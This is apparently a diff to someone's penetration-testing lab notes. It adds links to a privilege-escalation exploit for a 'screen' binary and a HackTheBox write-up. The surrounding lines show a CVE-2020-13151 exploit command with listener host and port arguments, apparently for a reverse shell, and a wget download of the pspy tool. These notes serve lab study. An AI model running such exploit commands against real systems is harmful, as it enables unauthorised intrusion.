@@ -103,6 +103,11 @@ python3 cve2020-13151.py --ahost 192.168.193.143 --lhost 192.168.45.219 --lport 
 
 https://github.com/DominicBreuker/pspy
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+
+# find screen unusualy binary from linpeas
+https://www.exploit-db.com/exploits/41154
+https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
+
 ```
 
 .144
